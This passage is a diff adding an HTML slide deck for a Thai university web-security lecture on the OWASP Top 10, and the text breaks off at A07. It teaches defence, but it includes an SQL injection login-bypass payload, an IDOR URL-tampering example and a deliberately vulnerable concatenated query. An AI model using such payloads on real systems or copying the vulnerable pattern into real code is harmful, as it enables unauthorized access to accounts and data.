@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 7: Web Application Security - ENGSE214</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent-primary: #38bdf8; /* Sky Blue */
+            --accent-secondary: #4ade80; /* Neon Green */
+            --accent-danger: #f87171; /* Red */
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            font-family: 'Sarabun', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        h1, h2, h3, .brand-font {
+            font-family: 'Orbitron', sans-serif; /* Cyberpunk style font for headers */
+        }
+
+        .code-font {
+            font-family: 'Fira Code', monospace;
+        }
+
+        /* Slide Transitions */
+        .slide {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transform: translateX(50px);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem 4rem;
+            box-sizing: border-box;
+            background: radial-gradient(circle at top right, #1e293b 0%, #0f172a 60%);
+        }
+
+        .slide.active {
+            opacity: 1;
+            transform: translateX(0);
+            pointer-events: all;
+            z-index: 10;
+        }
+
+        .slide.prev {
+            transform: translateX(-50px);
+            opacity: 0;
+        }
+
+        /* Glassmorphism Cards */
+        .glass-card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        /* Syntax Highlighting Mock */
+        .code-block {
+            background: #0d1117;
+            border-left: 4px solid var(--accent-secondary);
+            color: #c9d1d9;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            position: relative;
+            overflow-x: auto;
+        }
+        .code-keyword { color: #ff7b72; }
+        .code-string { color: #a5d6ff; }
+        .code-func { color: #d2a8ff; }
+        .code-comment { color: #8b949e; font-style: italic; }
+
+        /* Controls */
+        .controls-area {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 1rem;
+            z-index: 100;
+            background: rgba(15, 23, 42, 0.9);
+            padding: 0.75rem 1.5rem;
+            border-radius: 9999px;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            transition: opacity 0.3s;
+        }
+        
+        .btn-ctrl {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: all 0.2s;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-ctrl:hover {
+            color: var(--accent-primary);
+            background: rgba(56, 189, 248, 0.1);
+            transform: scale(1.1);
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            z-index: 100;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px var(--accent-primary);
+        }
+
+        /* Slide Number */
+        .slide-indicator {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            font-family: 'Fira Code', monospace;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        /* Custom Bullet Points */
+        ul.tech-list li {
+            position: relative;
+            padding-left: 1.5rem;
+            margin-bottom: 0.75rem;
+        }
+        ul.tech-list li::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: var(--accent-secondary);
+            font-family: 'Fira Code', monospace;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div id="slide-container" class="relative w-full h-full">
+        <div class="slide active">
+            <div class="text-center">
+                <div class="inline-block p-2 px-4 rounded-full border border-sky-500/30 bg-sky-500/10 text-sky-400 mb-6 font-mono text-sm tracking-wider">
+                    WEEK 07: MODULE ENGSE214
+                </div>
+                <h1 class="text-6xl md:text-7xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-sky-400 to-emerald-400 filter drop-shadow-lg">
+                    Web Application Security
+                </h1>
+                <h2 class="text-3xl text-slate-300 mb-8 font-light">& OWASP Overview</h2>
+                
+                <div class="glass-card p-8 max-w-2xl mx-auto mt-8 transform hover:scale-105 transition-transform duration-300">
+                    <div class="flex items-center gap-4 mb-4 border-b border-gray-700 pb-4">
+                        <div class="w-12 h-12 rounded-full bg-gradient-to-tr from-sky-500 to-blue-600 flex items-center justify-center">
+                            <i class="fas fa-user-shield text-xl text-white"></i>
+                        </div>
+                        <div class="text-left">
+                            <p class="text-sm text-slate-400">LECTURER</p>
+                            <p class="font-bold text-lg text-white">Software Engineer & Cyber Security Specialist</p>
+                        </div>
+                    </div>
+                    <p class="text-slate-300 leading-relaxed">
+                        "ในโลกที่ทุกอย่างเชื่อมต่ออินเทอร์เน็ต ความปลอดภัยไม่ใช่ทางเลือก แต่เป็นรากฐานของการพัฒนาซอฟต์แวร์"
+                    </p>
+                </div>
+                <div class="mt-12 animate-bounce text-slate-500">
+                    <p class="text-sm">กด <span class="bg-slate-800 px-2 py-1 rounded text-sky-400 font-mono">Spacebar</span> หรือ <span class="bg-slate-800 px-2 py-1 rounded text-sky-400 font-mono">→</span> เพื่อเริ่มเรียน</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-4xl font-bold mb-10 text-sky-400 border-l-8 border-sky-500 pl-6">Agenda: แผนการเรียนรู้</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-5xl">
+                <div class="glass-card p-6 hover:bg-slate-800/50 transition">
+                    <h3 class="text-xl font-bold text-emerald-400 mb-2">1. Review Week 6</h3>
+                    <p class="text-slate-400 text-sm">ทบทวน Cryptography พื้นฐานที่จำเป็นสำหรับ Web Security</p>
+                </div>
+                <div class="glass-card p-6 hover:bg-slate-800/50 transition">
+                    <h3 class="text-xl font-bold text-sky-400 mb-2">2. Web Security Context</h3>
+                    <p class="text-slate-400 text-sm">ทำไมเว็บถึงตกเป็นเป้าหมาย? สถิติและ CIA Triad</p>
+                </div>
+                <div class="glass-card p-6 hover:bg-slate-800/50 transition">
+                    <h3 class="text-xl font-bold text-red-400 mb-2">3. OWASP Top 10 (2021)</h3>
+                    <p class="text-slate-400 text-sm">เจาะลึก 10 ช่องโหว่ยอดฮิตที่นักพัฒนาต้องรู้</p>
+                </div>
+                <div class="glass-card p-6 hover:bg-slate-800/50 transition">
+                    <h3 class="text-xl font-bold text-yellow-400 mb-2">4. Deep Dive & Workshop</h3>
+                    <p class="text-slate-400 text-sm">SQL Injection, XSS และแนวทางการเขียน Code ป้องกัน (Secure Coding)</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <div class="absolute top-10 right-10 opacity-20">
+                <i class="fas fa-history text-9xl"></i>
+            </div>
+            <h2 class="text-4xl font-bold mb-8 text-slate-200">🔄 Review Week 6: Cryptography</h2>
+            <p class="text-xl text-slate-400 mb-10 max-w-3xl text-center">
+                ก่อนจะไปเรื่อง Web Security เราต้องแม่นเรื่อง "การเข้ารหัส" เพราะเป็นหัวใจของการส่งข้อมูลที่ปลอดภัย
+            </p>
+            <div class="flex gap-6 flex-wrap justify-center">
+                <div class="bg-slate-800 p-6 rounded-lg w-64 border border-slate-700">
+                    <i class="fas fa-key text-yellow-500 text-3xl mb-4"></i>
+                    <h3 class="font-bold mb-2">Symmetric</h3>
+                    <p class="text-xs text-slate-400">กุญแจดอกเดียว (AES, DES) เร็วแต่แจกจ่ายยาก</p>
+                </div>
+                <div class="bg-slate-800 p-6 rounded-lg w-64 border border-slate-700">
+                    <i class="fas fa-lock text-green-500 text-3xl mb-4"></i>
+                    <h3 class="font-bold mb-2">Asymmetric</h3>
+                    <p class="text-xs text-slate-400">คู่กุญแจ Public/Private (RSA) ช้าแต่ปลอดภัย</p>
+                </div>
+                <div class="bg-slate-800 p-6 rounded-lg w-64 border border-slate-700">
+                    <i class="fas fa-fingerprint text-purple-500 text-3xl mb-4"></i>
+                    <h3 class="font-bold mb-2">Hashing</h3>
+                    <p class="text-xs text-slate-400">แปลงกลับไม่ได้ (SHA-256) เช็ค Integrity</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-sky-400">Week 6 เชื่อมโยงกับ Week 7 อย่างไร?</h2>
+            <div class="grid grid-cols-2 gap-12 items-center w-full max-w-5xl">
+                <div class="space-y-6">
+                    <div class="p-4 border-l-4 border-yellow-500 bg-yellow-500/10 rounded-r">
+                        <h4 class="font-bold text-yellow-400">Data in Transit</h4>
+                        <p class="text-sm">HTTPS (SSL/TLS) ใช้ Cryptography ป้องกันการดักฟังระหว่าง Browser <-> Server</p>
+                    </div>
+                    <div class="p-4 border-l-4 border-red-500 bg-red-500/10 rounded-r">
+                        <h4 class="font-bold text-red-400">Data at Rest</h4>
+                        <p class="text-sm">Database เก็บ Password ต้องใช้ Hashing (Bcrypt) ไม่ใช่ Plaintext</p>
+                    </div>
+                </div>
+                <div class="glass-card p-6 flex flex-col items-center justify-center h-64">
+                    <i class="fas fa-exclamation-triangle text-6xl text-orange-500 mb-4 animate-pulse"></i>
+                    <p class="text-center font-bold">"Cryptography ที่ดี ไม่ช่วยอะไร<br>ถ้า Web Application มีช่องโหว่!"</p>
+                    <p class="text-xs text-slate-400 mt-2">เช่น SQL Injection สามารถขโมย Hash ออกมาได้</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-5xl font-bold text-center mb-6 text-white">Why Web Security?</h2>
+            <div class="flex justify-center gap-8 mt-8">
+                <div class="text-center w-1/3">
+                    <div class="text-6xl font-bold text-red-500 mb-2 code-font count-up" data-target="43">43%</div>
+                    <p class="text-slate-300">ของการโจมตีไซเบอร์ทั้งหมด<br>มุ่งเป้าที่ Web Application</p>
+                </div>
+                <div class="text-center w-1/3">
+                    <div class="text-6xl font-bold text-orange-500 mb-2 code-font count-up" data-target="94">94%</div>
+                    <p class="text-slate-300">ของเว็บที่ถูกทดสอบ<br>พบช่องโหว่อย่างน้อย 1 จุด</p>
+                </div>
+            </div>
+            <div class="mt-12 bg-slate-800/50 p-6 rounded-xl border border-slate-600 max-w-3xl">
+                <p class="text-center italic text-slate-400">
+                    "Web App คือหน้าด่านที่เข้าถึงง่ายที่สุด เพราะต้องเปิด Public ให้คนทั่วโลกเข้าใช้งาน Hacker จึงชอบโจมตีทางนี้"
+                </p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-10 text-slate-200">The CIA Triad : มุมมอง Web App</h2>
+            <div class="grid grid-cols-3 gap-6 w-full max-w-6xl">
+                <div class="glass-card p-6 hover:border-sky-500 transition duration-300 group">
+                    <div class="text-4xl text-sky-500 mb-4 group-hover:scale-110 transition"><i class="fas fa-user-secret"></i></div>
+                    <h3 class="text-xl font-bold mb-3 text-sky-400">Confidentiality</h3>
+                    <p class="text-sm text-slate-400 mb-2">ความลับของข้อมูล</p>
+                    <ul class="text-xs text-slate-500 list-disc ml-4 space-y-1">
+                        <li>User คนอื่นไม่ควรเห็นข้อมูลเรา</li>
+                        <li>Admin ไม่ควรเห็น Password User</li>
+                        <li><span class="text-red-400">Attack:</span> Data Breach, SQL Injection</li>
+                    </ul>
+                </div>
+                <div class="glass-card p-6 hover:border-emerald-500 transition duration-300 group">
+                    <div class="text-4xl text-emerald-500 mb-4 group-hover:scale-110 transition"><i class="fas fa-file-signature"></i></div>
+                    <h3 class="text-xl font-bold mb-3 text-emerald-400">Integrity</h3>
+                    <p class="text-sm text-slate-400 mb-2">ความถูกต้องครบถ้วน</p>
+                    <ul class="text-xs text-slate-500 list-disc ml-4 space-y-1">
+                        <li>ข้อมูลไม่ถูกแก้ไขระหว่างทาง</li>
+                        <li>ราคาสินค้าไม่ถูกเปลี่ยนโดยลูกค้า</li>
+                        <li><span class="text-red-400">Attack:</span> Parameter Tampering</li>
+                    </ul>
+                </div>
+                <div class="glass-card p-6 hover:border-purple-500 transition duration-300 group">
+                    <div class="text-4xl text-purple-500 mb-4 group-hover:scale-110 transition"><i class="fas fa-server"></i></div>
+                    <h3 class="text-xl font-bold mb-3 text-purple-400">Availability</h3>
+                    <p class="text-sm text-slate-400 mb-2">ความพร้อมใช้งาน</p>
+                    <ul class="text-xs text-slate-500 list-disc ml-4 space-y-1">
+                        <li>เว็บต้องเข้าได้ตลอดเวลา</li>
+                        <li>ระบบไม่ล่มเมื่อ traffic เยอะ</li>
+                        <li><span class="text-red-400">Attack:</span> DDoS, Ransomware</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <div class="flex items-center gap-6 mb-8">
+                <div class="bg-white p-4 rounded-full h-24 w-24 flex items-center justify-center">
+                    <img src="https://owasp.org/assets/images/logo.png" alt="OWASP Logo" class="w-full">
+                </div>
+                <div>
+                    <h2 class="text-4xl font-bold text-white">What is OWASP?</h2>
+                    <p class="text-slate-400">Open Worldwide Application Security Project</p>
+                </div>
+            </div>
+            <div class="glass-card p-8 max-w-4xl w-full">
+                <ul class="tech-list text-lg space-y-4 text-slate-300">
+                    <li>องค์กรไม่แสวงหากำไร (Non-profit) ระดับโลกที่เน้นเรื่อง Software Security</li>
+                    <li>เป้าหมาย: ทำให้ Software ปลอดภัยขึ้น (Visible Software Security)</li>
+                    <li><strong>OWASP Top 10:</strong> เอกสารสรุป 10 ความเสี่ยงด้านความปลอดภัยของ Web Application ที่พบบ่อยและร้ายแรงที่สุด (อัปเดตทุก 3-4 ปี ล่าสุดคือ 2021)</li>
+                    <li>เป็น "Standard" ที่ Developer และ Security Auditor ทั่วโลกใช้</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-sky-400">🏆 OWASP Top 10: 2021 Version</h2>
+            <div class="grid grid-cols-2 gap-x-12 gap-y-2 w-full max-w-6xl">
+                <div class="space-y-3">
+                    <div class="flex items-center p-3 bg-red-900/30 border-l-4 border-red-500 rounded hover:bg-red-900/50 transition cursor-pointer">
+                        <span class="font-bold text-red-400 mr-3">A01</span> Broken Access Control 
+                        <i class="fas fa-arrow-up text-green-400 ml-auto text-xs transform rotate-45"></i>
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A02</span> Cryptographic Failures
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A03</span> Injection
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A04</span> Insecure Design <span class="text-xs bg-blue-600 text-white px-1 rounded ml-2">New</span>
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A05</span> Security Misconfiguration
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A06</span> Vulnerable & Outdated Components
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A07</span> Identification & Auth Failures
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A08</span> Software & Data Integrity Failures <span class="text-xs bg-blue-600 text-white px-1 rounded ml-2">New</span>
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A09</span> Security Logging & Monitoring Failures
+                    </div>
+                    <div class="flex items-center p-3 bg-slate-800/50 border-l-4 border-slate-600 rounded">
+                        <span class="font-bold text-slate-400 mr-3">A10</span> Server-Side Request Forgery <span class="text-xs bg-blue-600 text-white px-1 rounded ml-2">New</span>
+                    </div>
+                </div>
+            </div>
+            <p class="mt-6 text-sm text-slate-500">*เปรียบเทียบกับปี 2017: Injection ตกมาอยู่อันดับ 3 แต่ Broken Access Control ขึ้นมาเป็นอันดับ 1</p>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-4 text-red-400">A01: Broken Access Control (อันดับ 1)</h2>
+            <div class="flex gap-8 w-full max-w-6xl items-start">
+                <div class="w-1/2">
+                    <div class="glass-card p-6 h-full">
+                        <h3 class="text-xl font-bold text-white mb-3">Concept</h3>
+                        <p class="text-slate-300 mb-4">
+                            ระบบมีการตรวจสอบตัวตน (Authentication) แต่ **ขาดการตรวจสอบสิทธิ์ (Authorization)** อย่างถูกต้อง ทำให้ผู้ใช้สามารถทำในสิ่งที่ตนไม่มีสิทธิ์ทำ
+                        </p>
+                        <ul class="tech-list text-sm text-slate-400">
+                            <li>ดูข้อมูลคนอื่น (Insecure Direct Object References - IDOR)</li>
+                            <li>เข้าหน้า Admin โดยไม่ได้เป็น Admin</li>
+                            <li>ข้ามผ่าน Checkbox หรือ Form validation</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="w-1/2">
+                    <h3 class="text-lg font-bold text-white mb-2">Example Scenario</h3>
+                    <div class="code-block">
+                        <span class="code-comment">// URL ปกติของ User A (ID: 101)</span><br>
+                        https://bank.com/account?id=101<br><br>
+                        <span class="code-comment">// Hacker เปลี่ยน ID เล่นๆ เป็น 102</span><br>
+                        <span class="text-red-400">https://bank.com/account?id=102</span><br><br>
+                        <span class="code-comment">// Server ตอบกลับข้อมูลของ User B มาเฉยเลย!</span><br>
+                        { "user": "B", "balance": "1,000,000" }
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-emerald-400"><i class="fas fa-shield-alt"></i> Prevention: A01</h2>
+            <div class="w-full max-w-4xl">
+                <h3 class="text-xl text-white mb-4">แนวทางการป้องกัน</h3>
+                <div class="space-y-4">
+                    <div class="p-4 bg-slate-800 rounded border-l-4 border-emerald-500">
+                        <h4 class="font-bold text-emerald-300">1. Deny by Default</h4>
+                        <p class="text-sm text-slate-400">ปิดทุกอย่างไว้ก่อน แล้วอนุญาตเฉพาะสิ่งที่จำเป็น</p>
+                    </div>
+                    <div class="p-4 bg-slate-800 rounded border-l-4 border-emerald-500">
+                        <h4 class="font-bold text-emerald-300">2. Implement Access Control on Server-side</h4>
+                        <p class="text-sm text-slate-400">อย่าเชื่อ Client side validation! ต้องเช็คที่ Server ทุก request</p>
+                    </div>
+                    <div class="code-block mt-4">
+                        <span class="code-func">app.get</span>(<span class="code-string">"/account"</span>, <span class="code-keyword">async</span> (req, res) => {<br>
+                        &nbsp;&nbsp;<span class="code-keyword">const</span> user = <span class="code-func">getUserFromSession</span>(req);<br>
+                        &nbsp;&nbsp;<span class="code-keyword">const</span> requestedId = req.query.id;<br><br>
+                        &nbsp;&nbsp;<span class="code-comment">// ✅ Secure: Check ownership</span><br>
+                        &nbsp;&nbsp;<span class="code-keyword">if</span> (user.id !== requestedId && !user.isAdmin) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">return</span> res.status(403).send(<span class="code-string">"Forbidden"</span>);<br>
+                        &nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;<span class="code-comment">// ... Proceed ...</span><br>
+                        });
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-4 text-red-400">A02: Cryptographic Failures</h2>
+            <p class="text-xl text-slate-300 mb-6 max-w-3xl text-center">
+                เดิมคือ "Sensitive Data Exposure" เน้นที่ความล้มเหลวของการเข้ารหัสข้อมูล
+            </p>
+            <div class="grid grid-cols-2 gap-8 w-full max-w-5xl">
+                <div class="glass-card p-6 border-red-500/30 border">
+                    <h3 class="text-lg font-bold text-red-400 mb-3"><i class="fas fa-times-circle"></i> สิ่งที่มักทำผิด</h3>
+                    <ul class="text-slate-400 space-y-2 text-sm">
+                        <li>เก็บ Password เป็น Plain Text หรือ Encrypt (ที่ถอดได้)</li>
+                        <li>ใช้ Hash เก่าๆ เช่น MD5, SHA1</li>
+                        <li>ส่งข้อมูลสำคัญผ่าน HTTP (ไม่ใช้ HTTPS)</li>
+                        <li>Hardcode Key ไว้ใน Source Code</li>
+                    </ul>
+                </div>
+                <div class="glass-card p-6 border-emerald-500/30 border">
+                    <h3 class="text-lg font-bold text-emerald-400 mb-3"><i class="fas fa-check-circle"></i> สิ่งที่ควรทำ</h3>
+                    <ul class="text-slate-400 space-y-2 text-sm">
+                        <li><strong>Data at Rest:</strong> Encrypt ข้อมูลสำคัญใน DB (AES-256)</li>
+                        <li><strong>Password:</strong> ใช้ Salted Hash (Argon2, Bcrypt, PBKDF2)</li>
+                        <li><strong>Data in Transit:</strong> บังคับใช้ HTTPS (TLS 1.2+) เสมอ</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <div class="bg-red-500/10 p-4 rounded-full mb-4 animate-pulse">
+                <i class="fas fa-syringe text-5xl text-red-500"></i>
+            </div>
+            <h2 class="text-4xl font-bold mb-4 text-white">A03: Injection</h2>
+            <p class="text-xl text-slate-400 mb-8 max-w-3xl text-center">
+                การที่ "User Input" ถูกตีความว่าเป็น "Command" ทำให้ผู้ไม่ประสงค์ดีสามารถสั่งงานระบบได้
+            </p>
+            <div class="flex gap-4">
+                <div class="px-6 py-3 bg-slate-800 rounded border border-slate-600">SQL Injection (SQLi)</div>
+                <div class="px-6 py-3 bg-slate-800 rounded border border-slate-600">Command Injection</div>
+                <div class="px-6 py-3 bg-slate-800 rounded border border-slate-600">LDAP Injection</div>
+                <div class="px-6 py-3 bg-slate-800 rounded border border-slate-600">NoSQL Injection</div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-sky-400">Deep Dive: SQL Injection (SQLi)</h2>
+            <div class="w-full max-w-5xl">
+                <div class="code-block text-lg">
+                    <span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <br>
+                    <span class="code-keyword">WHERE</span> username = '<span class="text-yellow-400">$username</span>' <br>
+                    <span class="code-keyword">AND</span> password = '<span class="text-yellow-400">$password</span>';
+                </div>
+                
+                <div class="mt-8 flex flex-col gap-4">
+                    <p class="text-slate-300">ถ้า Hacker ใส่ Username ว่า:</p>
+                    <div class="bg-white text-black p-3 rounded font-mono font-bold text-lg border-l-8 border-red-500">
+                        admin' OR '1'='1
+                    </div>
+                    <p class="text-slate-300">Query จะกลายเป็น:</p>
+                    <div class="code-block border-red-500">
+                        <span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <br>
+                        <span class="code-keyword">WHERE</span> username = '<span class="text-red-400">admin' OR '1'='1</span>' <br>
+                        <span class="code-keyword">AND</span> password = '...';
+                    </div>
+                </div>
+                <div class="mt-4 text-center">
+                    <p class="text-red-400 font-bold text-xl animate-pulse">⚠️ ผลลัพธ์: '1'='1' เป็นจริงเสมอ -> Login ผ่านโดยไม่ต้องรู้ Password!</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-emerald-400">Solution: Parameterized Queries</h2>
+            <div class="w-full max-w-5xl grid grid-cols-2 gap-8">
+                <div>
+                    <h3 class="text-red-400 font-bold mb-2">❌ VULNERABLE (Concatenation)</h3>
+                    <div class="code-block text-sm h-40">
+                        String query = <br>
+                        "SELECT * FROM users WHERE id = " <br>
+                        + <span class="text-red-400">request.getParameter("id")</span>;
+                    </div>
+                    <p class="text-xs text-slate-500 mt-2">Input ถูกเอาไปต่อ String โดยตรง DB แยกไม่ออกว่าไหนคำสั่ง ไหนข้อมูล</p>
+                </div>
+                <div>
+                    <h3 class="text-emerald-400 font-bold mb-2">✅ SECURE (Prepared Statement)</h3>
+                    <div class="code-block text-sm h-40">
+                        String query = <br>
+                        "SELECT * FROM users WHERE id = <span class="text-emerald-400">?</span>";<br>
+                        stmt = con.prepareStatement(query);<br>
+                        stmt.setString(1, inputId);
+                    </div>
+                    <p class="text-xs text-slate-500 mt-2">ใช้ Placeholder (?) DB จะมอง Input เป็นแค่ "ข้อมูล" เท่านั้น ไม่เอาไปรัน</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-4 text-orange-400">A04: Insecure Design (New)</h2>
+            <div class="glass-card p-8 max-w-4xl text-center">
+                <i class="fas fa-drafting-compass text-6xl text-orange-400 mb-6"></i>
+                <p class="text-xl text-slate-300 mb-4">
+                    "เราไม่สามารถเขียน Code ให้ปลอดภัยได้... ถ้า Design มันพังตั้งแต่แรก"
+                </p>
+                <div class="text-left mt-8 space-y-4">
+                    <p class="text-slate-400"><strong class="text-white">ตัวอย่าง:</strong> เว็บขายของคืนเงินลูกค้าทันทีที่กดยกเลิก โดยไม่รอตรวจสอบสถานะสินค้าจริง (Business Logic Flaw)</p>
+                    <p class="text-slate-400"><strong class="text-white">วิธีแก้:</strong> Threat Modeling (จำลองการโจมตี) ตั้งแต่ช่วงออกแบบระบบ (Shift Left)</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-yellow-400">A05: Security Misconfiguration</h2>
+            <p class="text-slate-300 mb-8">ปัญหาที่เกิดจากการ "ตั้งค่า" ระบบไม่ดี ไม่ใช่ที่ Code</p>
+            <div class="grid grid-cols-2 gap-6 max-w-5xl">
+                <div class="bg-slate-800 p-4 rounded border-l-4 border-yellow-500">
+                    <h4 class="font-bold text-white">Default Accounts</h4>
+                    <p class="text-sm text-slate-400">admin/admin, root/password ยังใช้งานได้</p>
+                </div>
+                <div class="bg-slate-800 p-4 rounded border-l-4 border-yellow-500">
+                    <h4 class="font-bold text-white">Error Messages</h4>
+                    <p class="text-sm text-slate-400">แสดง Stack Trace หรือ Error ยาวๆ ให้ User เห็น (Hacker ชอบมาก เพราะรู้โครงสร้างระบบ)</p>
+                </div>
+                <div class="bg-slate-800 p-4 rounded border-l-4 border-yellow-500">
+                    <h4 class="font-bold text-white">Unprotected Files</h4>
+                    <p class="text-sm text-slate-400">เปิด Directory Listing ทิ้งไว้, เข้าถึง .git/ config ได้</p>
+                </div>
+                <div class="bg-slate-800 p-4 rounded border-l-4 border-yellow-500">
+                    <h4 class="font-bold text-white">Cloud Storage</h4>
+                    <p class="text-sm text-slate-400">S3 Bucket ตั้งเป็น Public Access โดยไม่ตั้งใจ</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-white">A06: Vulnerable & Outdated Components</h2>
+            <div class="glass-card p-8 max-w-4xl flex items-center gap-8">
+                <div class="text-8xl text-slate-600">
+                    <i class="fab fa-npm"></i>
+                </div>
+                <div>
+                    <p class="text-xl text-slate-300 mb-4">
+                        Modern Web App ไม่ได้เขียนเอง 100% เราใช้ Library/Framework (npm, maven, pip) เยอะมาก
+                    </p>
+                    <p class="text-red-400 font-bold">ความเสี่ยง:</p>
+                    <p class="text-slate-400 mb-4">ถ้า Library ที่เราใช้มีช่องโหว่ (CVE) = เว็บเรามีช่องโหว่ด้วย</p>
+                    <div class="bg-black p-4 rounded font-mono text-sm text-green-400 border border-slate-700">
+                        > npm audit<br>
+                        <span class="text-red-500">High severity vulnerability found in lodash < 4.17.19</span><br>
+                        > npm update lodash
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-pink-400">A07: Identification & Auth Failures</h2>
+            <div class="max-w-4xl w-full">
+                <div class="grid grid-cols-2 gap-8">
+                    <div>
+                        <h3 class="text-xl text-white mb-2">Common Weaknesses</h3>
+                        <ul class="tech-list text-slate-400">
+                            <li>อนุญาตให้ตั้งรหัสผ่านง่าย (123456)</li>
+                            <li>ไม่มีการป้องกัน Brute Force (Login ผิดได้รัวๆ)</li>
+                            <li>Session ID ไม่เปลี่ยนหลัง Login (Session Fixation)</li>
+                            <li>ลืมรหัสผ่าน (Forgot Password) ถามคำถามง่ายเกินไป</li>
+                        </ul>
+                    </div>
+                    <div class="flex flex-col justify-center bg-slate-800 p-6 rounded-xl">
+                        <div class="text-center mb-4">
+                            <i class="fas fa-passport text-5xl text-pink-400"></i>
+                        </div>
+                        <h3 class="text-center font-bold text-white mb-2">Best Practice</h3>
+                        <ul class="text-sm text-green-400 list-check space-y-2">
+                            <li>✅ Multi-Factor Authentication (MFA)</li>
+                            <li>✅ Password Complexity Policy</li>
+                            <li>✅ Limit Login Attempts</li>
